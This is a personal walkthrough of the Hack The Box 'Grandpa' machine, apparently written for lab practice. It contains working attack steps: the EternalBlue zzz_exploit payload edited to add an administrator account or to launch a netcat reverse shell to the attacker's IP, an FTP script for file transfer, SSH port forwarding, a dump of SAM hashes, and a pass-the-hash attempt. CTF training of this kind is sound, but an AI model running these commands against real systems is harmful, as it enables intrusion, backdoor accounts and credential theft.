# Grandpa

```
kali@kali:~/htb/Grandpa$ sudo nmap -sV -sC 10.129.86.44
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 05:27 EST
Nmap scan report for 10.129.86.44
Host is up (0.027s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Sat, 23 Jan 2021 10:40:53 GMT
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

This seems similar to granny. If not identical. I try the same buffer overflow exploit. And I get the reverse shell immediately.

On granny, I used the open smb port on the server to upload a malicious exe file that kidnapped access tokens. This time, since the foothold is identical. I will try a different way of uploading the files.

So, we got the reverse shell. 

```
c:\windows\system32\inetsrv>netstat -nat
netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5859           0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.86.44:80        10.10.14.21:60858      ESTABLISHED     InHost      
  TCP    10.129.86.44:139       0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.86.44:1030      10.10.14.21:1337       ESTABLISHED     InHost      
  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING       InHost      
  UDP    0.0.0.0:445            *:*                    
  UDP    0.0.0.0:500            *:*                    
  UDP    0.0.0.0:1027           *:*                    
  UDP    0.0.0.0:4500           *:*                    
  UDP    10.129.86.44:123       *:*                    
  UDP    10.129.86.44:137       *:*                    
  UDP    10.129.86.44:138       *:*                    
  UDP    127.0.0.1:123          *:*                    
  UDP    127.0.0.1:1029         *:*                    
```

SMB port is open on this server as well, so we can do the same thing. But I want to try something different. I tried both powershell and certutil.exe on Granny. And those did not work, so they probably will not work here either. We still have ftp though. So let's try that.

Setting up a ftp server on our host:

```
kali@kali:~/htb/Grandpa$ sudo python -m pyftpdlib -p 21 -w
/usr/local/lib/python2.7/dist-packages/pyftpdlib-1.5.6-py2.7.egg/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.
  RuntimeWarning)
[I 2021-01-23 06:39:35] concurrency model: async
[I 2021-01-23 06:39:35] masquerade (NAT) address: None
[I 2021-01-23 06:39:35] passive ports: None
[I 2021-01-23 06:39:35] >>> starting FTP server on 0.0.0.0:21, pid=29841 <<<
```
-m runs a library module as a script.

-p specifies the port

-w grants write access for logged in user.


We first navigate to temp, so we have writing permissions

```
c:\windows\system32\inetsrv>cd C:\Windows\temp
cd C:\Windows\temp
```

Then we create a ftp connection to our server and sent it to a text file called ftp.txt.

```
C:\WINDOWS\Temp>echo open 10.10.14.21 21  > ftp.txt
echo open 10.10.14.21 21  > ftp.txt
```
We send our user as anonymous

```
C:\WINDOWS\Temp>echo user anonymous >> ftp.txt
echo user anonymous >> ftp.txt
```
And no password

```
C:\WINDOWS\Temp>echo password >> ftp.txt
echo password >> ftp.txt
```
Binary means we set the transfer mode of ftp to binary files.

```
C:\WINDOWS\Temp>echo binary >> ftp.txt
echo binary >> ftp.txt
```
And then we get the binary file.
```
C:\WINDOWS\Temp>echo GET plink.exe >> ftp.txt
echo GET plink.exe >> ftp.txt
```
And terminate the connection
```
C:\WINDOWS\Temp>echo bye >> ftp.txt
echo bye >> ftp.txt
```
All in all:
```
C:\WINDOWS\Temp>type ftp.txt
type ftp.txt
open 10.10.14.21 21  
user anonymous 
password 
binary 
GET plink.exe 
bye 
```

If you want you can also upload nc.exe, to run as administrator later in order to get root shell.

And we can run it like this:

```
C:\WINDOWS\Temp>ftp -v -n -s:ftp.txt
ftp -v -n -s:ftp.txt
Connected to 10.10.14.21.
open 10.10.14.21 21  
220 pyftpdlib 1.5.6 ready.
user anonymous 
331 Username ok, send password.

230 Login successful.
binary 
200 Type set to: Binary.
GET plink.exe 
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp: 311296 bytes received in 0.19Seconds 1664.68Kbytes/sec.
bye 
221 Goodbye.

C:\WINDOWS\Temp>
```

-v suppresses verbose response

-n suppresses auto-login

-s:file specifies the file that contains ftp commands.

So now we have uploaded plink.exe to the target machine. What can we use this for?

Plink is a command-line connection tool. It works very similar to SSH in linux terminals.

So first we need to configure our ssh server. 

`sudo vim /etc/ssh/sshd_config` to enable editing of the server config file. /etc/ssh/ssh_config is the client file. Note the d.

Port 22 is blocked on HTB, so we need to change the default port:

`Port 4222` at the top, Just remove the `#` and change the number

`PermitRootLogin yes` Remove the `#` and set it to yes. This will allow remote connections to log in as root. Which we want for this.

And add these lines at the bottom:
```
#Legacy changes
KexAlgorithms +diffie-hellman-group1-sha1
Ciphers +aes128-cbc
```
Which enables some key exchange algorithms so the machines can communicate.

And on the windows machine:

```
C:\WINDOWS\Temp>plink.exe -l root -pw kali -R 445:127.0.0.1:445 -P 4222 10.10.14.21
plink.exe -l root -pw kali -R 445:127.0.0.1:445 -P 4222 10.10.14.21
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's rsa2 key fingerprint is:
ssh-rsa 3072 61:87:0f:1b:6c:bc:7e:c3:25:2c:03:c2:5e:f1:2f:22
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) y
```

-l root signals that the login user is root

-pw is the password for the login, you can do `sudo passwd` and type a new password twice to get this.

-R listen-port:host:port Here we are forwarding a Remote port to a local address. 

We know that the 445 port is open from the windows machine, but not our machine. So we are using the 445 port to send and receive this remote ssh connection. So the windows outgoing port 445 is received by our port 4222. And our 4222 can access the windows port 445. So we have circumvented the fact that we cannot access port 445. And our outgoing 4222 port essentially acts as an entrance to port 455 on the windows machine.

-P the target port

And finally our ip.

We can check that this worked with the command:

```
kali@kali:~/htb/Grandpa$ sudo lsof -i:445
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
sshd    6568 root    9u  IPv6  67950      0t0  TCP localhost:microsoft-ds (LISTEN)
sshd    6568 root   10u  IPv4  67951      0t0  TCP localhost:microsoft-ds (LISTEN)
kali@kali:~/htb/Grandpa$ 
```

Lsof means “list open files” the -i lists ip sockets, and here we are specifying to only list ip sockets on port 445.

We can now see if we can find any vulnerabilities with crackmapexec, which is specialized for attacking networks:

```
kali@kali:/opt/CrackMapExec$ cme smb 127.0.0.1
SMB         127.0.0.1       445    GRANPA           [*] Windows Server 2003 R2 3790 Service Pack 2 (name:GRANPA) (domain:GRANPA) (signing:False) (SMBv1:True)
kali@kali:/opt/CrackMapExec$ 
```
I specialize smb, since we have that connection. And we can see that we have access to port 445 on GRANPA.

We can check if the target is patched for eternalblue with this https://github.com/worawit/MS17-010 : 

```
kali@kali:~/htb/Grandpa$ python ~/MS17-010/checker.py 127.0.0.1
Target OS: Windows Server 2003 R2 3790 Service Pack 2
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (32 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (32 bit)
browser: STATUS_OBJECT_NAME_NOT_FOUND
kali@kali:~/htb/Grandpa$ 
```

So we can see that the target is not patched.  And that the samr, and Isarpc pipes are OK.

I copy the script zzz_exploit.py and change the payload.

```
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()

        #print('creating file c:\\pwned.txt on the target')
        #tid2 = smbConn.connectTree('C$')
        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
        #smbConn.closeFile(tid2, fid2)
        #smbConn.disconnectTree(tid2)

        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c net user patchthis passw /add && net localgroup administrators patchthis /add')
```

Or

```
service_exec(conn, r'cmd /c C:\Windows\temp\nc.exe -e cmd.exe 10.10.14.21 1337')
``` 

If you are doing the netcat shell. -e will execute the following file once a connection is made. So we are connecting to 10.10.14.21 on port 1337, and running cmd.exe when it's done. Since, we will run this as root. The following cmd.exe shell will also be as root. 


`net user patchthis passw /add && net localgroup administrators patchthis /add`

Will add a new user patchthis with the password: passw. And it will be added to the administrators group. Note that if you want to copy these files away to not modify the originals, you need to copy mysmb.py as well. As it is required by both checker.py and zzz_exploit.py

```
kali@kali:~/htb/Grandpa$ python zzz_exploit.py 127.0.0.1 lsarpc
Target OS: Windows Server 2003 R2 3790 Service Pack 2
Groom packets
attempt controlling next transaction on x64
attempt controlling next transaction on x86
success controlling one transaction
Target is x86
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x84ff2d48
SESSION: 0xe12a1d38
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe13fc850
userAndGroupCount: 0x5
userAndGroupsAddr: 0xe13fc8f0
overwriting token UserAndGroups
Opening SVCManager on 127.0.0.1.....
Creating service ReVn.....
Starting service ReVn.....
SCMR SessionError: code: 0x41d - ERROR_SERVICE_REQUEST_TIMEOUT - The service did not respond to the start or control request in a timely fashion.
Removing service ReVn.....
Done
```

And now we can check if the user exists:

```
kali@kali:/opt/CrackMapExec$ sudo cme smb 127.0.0.1 -u patchthis -p passw
SMB         127.0.0.1       445    GRANPA           [*] Windows Server 2003 R2 3790 Service Pack 2 (name:GRANPA) (domain:GRANPA) (signing:False) (SMBv1:True)
SMB         127.0.0.1       445    GRANPA           [+] GRANPA\patchthis:passw (Pwn3d!)
```

So here we can see that the administrator account has been created.

```
kali@kali:/opt/CrackMapExec$ sudo cme smb 127.0.0.1 -u patchthis -p passw --sam
SMB         127.0.0.1       445    GRANPA           [*] Windows Server 2003 R2 3790 Service Pack 2 (name:GRANPA) (domain:GRANPA) (signing:False) (SMBv1:True)
SMB         127.0.0.1       445    GRANPA           [+] GRANPA\patchthis:passw (Pwn3d!)
SMB         127.0.0.1       445    GRANPA           [+] Dumping SAM hashes
SMB         127.0.0.1       445    GRANPA           Administrator:500:0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548:::                                                          
SMB         127.0.0.1       445    GRANPA           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                  
SMB         127.0.0.1       445    GRANPA           SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::                                                      
SMB         127.0.0.1       445    GRANPA           IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::                                                           
SMB         127.0.0.1       445    GRANPA           IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
SMB         127.0.0.1       445    GRANPA           ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
SMB         127.0.0.1       445    GRANPA           Harry:1008:93c50499355883d1441208923e8628e6:031f5563e0ac4ba538e8ea325479740d:::
SMB         127.0.0.1       445    GRANPA           patchthis:1009:d12e10919b6e0e15aad3b435b51404ee:f5feaa8e026b0deeef0b6371f3ae438e:::
SMB         127.0.0.1       445    GRANPA           [+] Added 8 SAM hashes to the database
kali@kali:/opt/CrackMapExec$ 
```

These are the password hashes of all the users on the machine. And on old windows systems they are very easily crackable. I’m trying to use Pass-the-Hash here to get shell access. 

```
kali@kali:/opt/CrackMapExec$ pth-winexe -U Administrator%0a70918d669baeb307012642393148ab:34dec8a1db14cdde2a21967c3c997548::: //127.0.0.1 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
ERROR: Cannot connect to svcctl pipe. NT_STATUS_IO_TIMEOUT.

```

But it does not work for some reason. I tried a python script named psexec.py as well, but nothing. Since this did not work as expected. I ended up just using the nc.exe binary we uploaded earlier.

Just running the eternalblue exploit again with the nc command. And having a listener:

```
kali@kali:/opt/CrackMapExec$ sudo rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.86.77 1067
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

I’m very happy I used eternalblue without metasploit for once. But I am disappointed that the pass-the-hash method did not work. Really good to get some port forwarding practice in. 


## Comparing myself to the official writeup:

The official writeup used the exact same process as Granny. Just find the exploit. Meterpreter. Local exploit suggester. Metasploit. root.

## How to stop this exploit:

Buffer overflow exploit is the same as I used on Granny. And since I used the same one here, I did a secondary method on that box. So the fix is the same. Update/patch/stay alert. Or fix the function itself.

And for the exploit, it’s don’t let users run binaries, update system so we don’t allow for Eternalblue, dont let users download files with ftp or smb.
